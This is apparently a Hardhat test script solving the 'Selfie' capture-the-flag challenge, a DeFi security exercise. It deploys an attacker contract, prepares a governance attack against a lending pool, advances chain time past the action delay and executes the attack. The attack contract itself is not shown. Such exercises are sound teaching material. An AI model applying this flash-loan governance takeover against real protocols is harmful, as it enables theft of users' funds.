...
describe("[Challenge] Selfie", function () {
    ...
    it("Exploit", async function () {
        ...
        const SelfieAbuserFactory = await ethers.getContractFactory("SelfieAbuser", attacker);
        this.selfieAbuser = await SelfieAbuserFactory.deploy();

        await this.selfieAbuser.prepareAttack(this.pool.address, this.governance.address, TOKENS_IN_POOL);

        const actionDelay = await this.governance.getActionDelay();
        await ethers.provider.send("evm_increaseTime", [actionDelay.toNumber() + 1]);

        await this.selfieAbuser.executeAttack();
    });
